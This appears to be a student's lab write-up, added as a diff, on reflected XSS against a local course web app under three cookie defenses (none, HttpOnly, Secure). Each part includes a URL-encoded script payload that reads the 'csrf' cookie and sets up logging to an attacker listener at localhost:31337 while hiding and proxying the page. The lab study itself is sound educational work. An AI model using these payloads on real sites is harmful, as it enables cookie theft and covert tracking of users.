@@ -1,0 +1,51 @@
+3.0
+	Part a: 
+	
+	Description:
+This is a reflected XSS attack. The same origin policy prevents the attacker from sending JavaScript directly to the target, but when JavaScript is injected into the search query, the origin is the localhost, which the target will execute JavaScript from. When there are no defenses, we can run any JavaScript in the search bar to get the cookie. 
+
+<script>   
+var csrf_cookie = document.cookie.split('; ').find(row => row.startsWith('csrf=')).split('=')[1];
+alert(csrf_cookie); 	
+</script> 
+"document.cookie" will return all three of the cookies, so we can grab the cookie named "csrf" and display it to the screen with an alert function.
+
+http://localhost/project2/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20var%20csrf_cookie%20%3D%20document.cookie.split(%27%3B%20%27).find(row%20%3D%3E%20row.startsWith(%27csrf%3D%27)).split(%27%3D%27)%5B1%5D%3B%0A%20%20%20%20alert(csrf_cookie)%3B%20%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23query%22).val(%22pwned!%22)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%0A%7D%3Bpayload(%22http%3A%2F%2Flocalhost%3A31337%2F%22)%3B%3C%2Fscript%3E
+	
+	
+	Part b:
+	
+	Description:
+The HTTPOnly flag completely prevents us from using client side scripts to get the cookie, so the JavaScript in this attack will not work.
+
+http://localhost/project2/search?xssdefense=0&csrfdefense=2&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20var%20csrf_cookie%20%3D%20document.cookie.split(%27%3B%20%27).find(row%20%3D%3E%20row.startsWith(%27csrf%3D%27)).split(%27%3D%27)%5B1%5D%3B%0A%20%20%20%20alert(csrf_cookie)%3B%20%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23query%22).val(%22pwned!%22)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%0A%7D%3Bpayload(%22http%3A%2F%2Flocalhost%3A31337%2F%22)%3B%3C%2Fscript%3E
+
+	Part c:
+
+	Description:
+The Secure flag only allows cookies to be sent over HTTPS, but it doesn't prevent cross site scripting. We aren't sending an HTTP request for this attack to work, so the Secure flag doesn't change anything.
+
+
+http://localhost/project2/search?xssdefense=0&csrfdefense=3&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20var%20csrf_cookie%20%3D%20document.cookie.split(%27%3B%20%27).find(row%20%3D%3E%20row.startsWith(%27csrf%3D%27)).split(%27%3D%27)%5B1%5D%3B%0A%20%20%20%20alert(csrf_cookie)%3B%20%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22%23query%22).val(%22pwned!%22)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22.%2F%22)%3B%0A%20%20%20%20%0A%7D%3Bpayload(%22http%3A%2F%2Flocalhost%3A31337%2F%22)%3B%3C%2Fscript%3E
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
